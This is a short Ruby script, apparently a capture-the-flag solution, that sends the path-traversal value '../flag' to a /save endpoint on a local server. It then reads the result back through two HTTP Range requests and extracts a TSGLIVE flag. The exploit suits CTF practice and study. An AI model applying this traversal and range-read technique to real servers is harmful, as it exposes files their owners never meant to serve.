require "json"
require "net/http"

host = "localhost"
port = "3457"

response = Net::HTTP.new(host, port).post("/save", "../flag", { "Content-Type" => "text/plain" })
location = JSON.parse(response.body)["location"]

body1 = Net::HTTP.new(host, port).get(location, { "Range" => "bytes=-290" }).body
body2 = Net::HTTP.new(host, port).get(location, { "Range" => "bytes=291-" }).body
puts "#{body1}#{body2}".scan(/TSGLIVE\{.+\}/).first
